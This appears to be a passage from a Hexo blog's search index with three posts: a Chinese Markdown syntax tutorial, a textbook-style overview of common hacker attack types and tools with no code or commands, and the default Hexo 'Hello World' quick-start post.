    <content type="html"><![CDATA[<h1 id="MarkDown："><a href="#MarkDown：" class="headerlink" title="MarkDown："></a>MarkDown：</h1><ul><li><a href="#markdown">MarkDown：</a><ul><li><em><a href="#%E4%B8%80%E7%BC%96%E8%BE%91%E5%99%A8">一、编辑器</a></em></li><li><em><a href="#%E4%BA%8C%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">二、基本用法</a></em></li><li><em><a href="#%E4%B8%89%E8%AF%AD%E6%B3%95">三、语法</a></em><ul><li><em><a href="#1%E6%A0%87%E9%A2%98">1、标题</a></em></li><li><em><a href="#2%E6%96%87%E5%AD%97%E6%A0%BC%E5%BC%8F">2、文字格式</a></em><ul><li><em><a href="#1%E7%B2%97%E4%BD%93">(1)粗体：</a></em></li><li><em><a href="#2%E6%96%9C%E4%BD%93">(2)斜体：</a></em></li><li><em><a href="#3%E7%B2%97%E6%96%9C%E4%BD%93">(3)粗斜体：</a></em></li><li><em><a href="#4%E5%88%A0%E9%99%A4">(4)删除:</a></em></li></ul></li></ul></li><li><em><a href="#3%E5%88%97%E8%A1%A8">3、列表</a></em><ul><li><em><a href="#1%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8">(1)无序列表：</a></em></li><li><em><a href="#2%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8">(2)有序列表:</a></em></li></ul></li><li><em><a href="#4%E9%93%BE%E6%8E%A5">4、链接</a></em><ul><li><em><a href="#1%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AE%E8%A1%8C%E5%86%85%E5%BD%A2%E5%BC%8F">(1)直接设置（行内形式)</a></em></li><li><em><a href="#2%E9%97%B4%E6%8E%A5%E8%AE%BE%E7%BD%AE%E5%8F%82%E8%80%83%E5%BD%A2%E5%BC%8F">(2)间接设置（参考形式）</a></em></li><li><em><a href="#3%E9%9A%90%E5%BC%8F%E8%AE%BE%E7%BD%AE">(3）隐式设置</a></em></li></ul></li><li><em><a href="#5%E5%9B%BE%E7%89%87">5、图片</a></em></li><li><em><a href="#6%E5%BC%95%E7%94%A8">6、引用</a></em></li><li><em><a href="#7%E6%B0%B4%E5%B9%B3%E5%88%86%E5%89%B2%E7%BA%BF">7、水平分割线</a></em></li><li><em><a href="#8%E8%A1%A8%E6%A0%BC">8、表格</a></em></li><li><em><a href="#9%E4%BB%A3%E7%A0%81">9、代码</a></em><ul><li><em><a href="#1%E4%BB%A3%E7%A0%81%E5%8F%A5">(1）代码句</a></em></li><li><em><a href="#2%E4%BB%A3%E7%A0%81%E6%AE%B5">(2）代码段</a></em></li><li><em><a href="#3%E7%94%A8%E4%B8%89%E4%B8%AA%E4%BB%A5%E4%B8%8A%E7%9A%84%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%AE%9A%E4%B9%89%E6%AE%B5%E5%BC%80%E5%A7%8B%E5%92%8C%E7%BB%93%E6%9D%9F">(3）用三个以上的反引号定义段开始和结束</a></em></li></ul></li><li><em><a href="#10%E7%9B%AE%E5%BD%95">10、目录</a></em></li><li><em><a href="#11%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6">11、转义字符</a></em></li><li><em><a href="#12uml%E5%9B%BE">12、UML图</a></em><ul><li><em><a href="#%E6%B8%B2%E6%9F%93%E5%BA%8F%E5%88%97%E5%9B%BE">渲染序列图：</a></em></li></ul></li></ul></li></ul><h2 id="一、编辑器"><a href="#一、编辑器" class="headerlink" title="一、编辑器"></a><em>一、编辑器</em></h2><p><strong>1、MarkDown Pad2</strong></p><p><a href="http://markdownpad.com/">MarkDown Pad2</a>目前用的人多，它可以边写边预览效果，免费生成html文档，但生成pdf文档须升级成专业版。</p><p><strong>2、Typora（推荐）</strong></p><p><a href="https://www.typora.io/">Typora</a>较为便利，输入标记符号后，软件会自动对标记的文本进行渲染，生成格式。 　　</p><h2 id="二、基本用法"><a href="#二、基本用法" class="headerlink" title="二、基本用法"></a><em>二、基本用法</em></h2><p>1、单个回车=空格<br> 2、连续回车=分段<br> 3、行尾加两个空格=段内换行<br> 4、HTML的注释 </p><h2 id="三、语法"><a href="#三、语法" class="headerlink" title="三、语法"></a><em>三、语法</em></h2><h3 id="1、标题"><a href="#1、标题" class="headerlink" title="1、标题"></a>1、标题</h3><p>#号之后记得空格，共有六级标题，以此类推。</p><p><img src="/2020/10/09/markdown/%E6%A0%87%E9%A2%98.jpg" alt="标题"></p><h3 id="2、文字格式"><a href="#2、文字格式" class="headerlink" title="2、文字格式"></a>2、文字格式</h3><h4 id="1-粗体："><a href="#1-粗体：" class="headerlink" title="(1)粗体："></a>(1)粗体：</h4><p>将需要设置为斜体的文字两端使用2个“*”或者“_”夹起来</p><p><img src="/2020/10/09/markdown/%E6%96%9C%E4%BD%93.jpg" alt="斜体"></p><h4 id="2-斜体："><a href="#2-斜体：" class="headerlink" title="(2)斜体："></a>(2)斜体：</h4><p>将需要设置为斜体的文字两端使用1个“*”或者“_”夹起来</p><p><img src="/2020/10/09/markdown/%E6%96%9C.jpg" alt="斜"></p><h4 id="3-粗斜体："><a href="#3-粗斜体：" class="headerlink" title="(3)粗斜体："></a>(3)粗斜体：</h4><p>将需要设置为斜体的文字两端使用3个“*”或者“_”夹起来</p><p><img src="/2020/10/09/markdown/%E7%B2%97%E6%96%9C.jpg" alt="粗斜"></p><h4 id="4-删除"><a href="#4-删除" class="headerlink" title="(4)删除:"></a>(4)删除:</h4><p>使用2个~号即可。</p><p><img src="/2020/10/09/markdown/%E5%88%A0.jpg" alt="删"></p><h2 id="3、列表"><a href="#3、列表" class="headerlink" title="3、列表"></a>3、列表</h2><h3 id="1-无序列表："><a href="#1-无序列表：" class="headerlink" title="(1)无序列表："></a>(1)无序列表：</h3><p>在文字开头添加(*,+,-)实现无序列表。但是要注意在符号和文字之间需要添加空格。</p><p> 嵌套:上一级和下一级之间需要三个空格或tab键</p><p><img src="/2020/10/09/markdown/%E5%B5%8C%E5%A5%97.jpg" alt="嵌套"></p><h3 id="2-有序列表"><a href="#2-有序列表" class="headerlink" title="(2)有序列表:"></a>(2)有序列表:</h3><p>使用数字后面跟上句号,还要有空格。</p><p><img src="/2020/10/09/markdown/%E5%88%97%E8%A1%A8.jpg" alt="列表"></p><h2 id="4、链接"><a href="#4、链接" class="headerlink" title="4、链接"></a>4、链接</h2><h3 id="1-直接设置（行内形式"><a href="#1-直接设置（行内形式" class="headerlink" title="(1)直接设置（行内形式)"></a>(1)直接设置（行内形式)</h3><p>语法：<a href="%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80" title="链接title">链接名</a></p><h3 id="2-间接设置（参考形式）"><a href="#2-间接设置（参考形式）" class="headerlink" title="(2)间接设置（参考形式）"></a>(2)间接设置（参考形式）</h3><p> <strong>语法：[链接名称][标记]</strong><br>[标记]: 链接地址 “链接title”</p><h3 id="3）隐式设置"><a href="#3）隐式设置" class="headerlink" title="(3）隐式设置"></a>(3）隐式设置</h3><p><strong>语法：[链接名称][]</strong><br>[链接名称]: 链接地址 “链接title”</p><h2 id="5、图片"><a href="#5、图片" class="headerlink" title="5、图片"></a>5、图片</h2><p>直接复制一个图片路径到编辑器，然后前面加上感叹号！即可</p><h2 id="6、引用"><a href="#6、引用" class="headerlink" title="6、引用"></a>6、引用</h2><p>（1）引用换行：末尾加两个空格。</p><p>  (2）引用内包含其他语法：</p><p> <strong>如：</strong>标题、列表、代码块 <strong>一定要写在引开头处</strong></p><p><img src="/2020/10/09/markdown/%E5%BC%95.jpg" alt="引"></p><h2 id="7、水平分割线"><a href="#7、水平分割线" class="headerlink" title="7、水平分割线"></a>7、水平分割线</h2><p>用3个连续的*或_或-即可</p><h2 id="8、表格"><a href="#8、表格" class="headerlink" title="8、表格"></a>8、表格</h2><p>关于冒号（:）</p><p><strong>左边：</strong>以下内容左对齐 </p><p><strong>右边：</strong>以下内容右对齐 </p><p> <strong>两边：</strong>以下内容居中对齐</p><p><img src="/2020/10/09/markdown/%E8%A1%A8%E6%A0%BC.jpg" alt="表格"></p><h2 id="9、代码"><a href="#9、代码" class="headerlink" title="9、代码"></a>9、代码</h2><h3 id="1）代码句"><a href="#1）代码句" class="headerlink" title="(1）代码句"></a>(1）代码句</h3><p>用反引号（`），就是英文状态下的波浪线。</p><h3 id="2）代码段"><a href="#2）代码段" class="headerlink" title="(2）代码段"></a>(2）代码段</h3><p>4个空格（或Tab缩进）定义代码块。</p><h3 id="3）用三个以上的反引号定义段开始和结束"><a href="#3）用三个以上的反引号定义段开始和结束" class="headerlink" title="(3）用三个以上的反引号定义段开始和结束"></a>(3）用三个以上的反引号定义段开始和结束</h3><h2 id="10、目录"><a href="#10、目录" class="headerlink" title="10、目录"></a>10、目录</h2><p>在想加目录的地方输入[TOC]</p><h2 id="11、转义字符"><a href="#11、转义字符" class="headerlink" title="11、转义字符"></a>11、转义字符</h2><p><img src="/2020/10/09/markdown/%E5%AD%97%E7%AC%A6.jpg" alt="字符"></p><h2 id="12、UML图"><a href="#12、UML图" class="headerlink" title="12、UML图"></a>12、UML图</h2><h3 id="渲染序列图："><a href="#渲染序列图：" class="headerlink" title="渲染序列图："></a>渲染序列图：</h3><p><img src="/2020/10/09/markdown/%E5%93%88.jpg" alt="哈"></p><p>效果如下:</p><p><img src="/2020/10/09/markdown/%E5%95%A6.jpg" alt="啦"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Cyber security tour</title>
    <link href="/2020/10/05/Cyber/"/>
    <url>/2020/10/05/Cyber/</url>
    
    <content type="html"><![CDATA[<p> 黑客(Hacher）</p><p><img src="/2020/10/05/Cyber/%E9%BB%91%E5%AE%A2.jpg" alt="黑客"></p><p>源于英语动词 hack，意为“劈，砍”。黑客主要利用计算机系统或网络的漏洞，包括软件漏洞、硬件漏洞、网络协议漏洞、管理方面的漏洞喝一些人为的错误，通过现有的或自己开发的工具软件实施攻击。黑客攻击手段主要包括：<br>（1）探测攻击。通过少票允许连接的服务和开放的端口，能够迅速发现目标主机端口的分配情况以及提供的各项服务和服务程序的版本号，黑客找到有机可乘的服务或端口后进行攻击。常见的探测攻击程序有：SATAN、Saint、NTscan、Nessus等。<br>  (2)网络监听。将网卡设置为混杂模式，对以太网上流通的所有数据包进行监听，并将符合一定条件的数据包记录到文件中去，以获取敏感信息。常见的网络监听工具有：NetRay、Sniffit、Sniffer、Etherfind、Snoop等。<br>（3)解码类攻击。通过各种方法获取 password文件，然后用口令猜测程序破译用户账号和密码。常见的工具有：Crack、LOphtCrack、John the Ripper等。<br>(4)未授权访问尝试。利用系统管理策略或配置文件的漏洞，获得比合法权限更高的操作权。如：NFS猜测、NFS UID检查等。<br>(5)缓冲区溢出。通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程<br>序的堆栈，使程序转而执行其他的指令，如果这些指令是放在root 权限的内存中，那么一旦这些<br>指令得到了运行，黑客就以root 权限控制了系统，达到入侵的目的。缓冲区攻击的目的在于扰乱<br>某些以特权身份运行的程序的功能。使攻击者获得程序的控制权。<br>（6)伪装攻击，通过指定路由或伪造家地址，以假冒身份于其他主机进行合法通讯、或发送假<br>数据包，使受攻击主机出现错误动作。如IP欺骗。<br>(7)电子欺骗攻击。黑客利用TCP/TP协议本身的一些缺陷对TCP/IP网络进行攻击，主要方式<br>有：ARP欺骗、DNS欺骗、Web 欺骗、电子邮件欺骗等，</p><p>(8)WWW攻击。利用WEB的不合理配置，或CGI程序的漏洞进行攻击，达到获取脚本源码，非法<br>执行程序，使WWW服务器崩溃等目的。如：Windouws NT的IIS服务器的多种攻击。<br>(9)拒绝服务和分布式拒绝服务攻击。这种攻击行为通过发送一定数量一定序列的数据包，是<br>网络服务器中充斥了大量要求回复的信息，消耗网络带宽或系统资源，导致网络或系统不胜负荷以<br>至瘫痪、停止正常的网络服务。<br>（10)病毒攻击。病毒是黑客实施网络攻击的有效手段之一，它具有隐蔽性、寄生性、繁殖性和<br>破坏性，而且在网络中更加可怕。目前可通过网络进行传播的病毒已有数千中。<br>为了对这些影响网络安全的威胁进行有效防范，我们必须采用有效的技术手段。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/10/04/hello-world/"/>
    <url>/2020/10/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
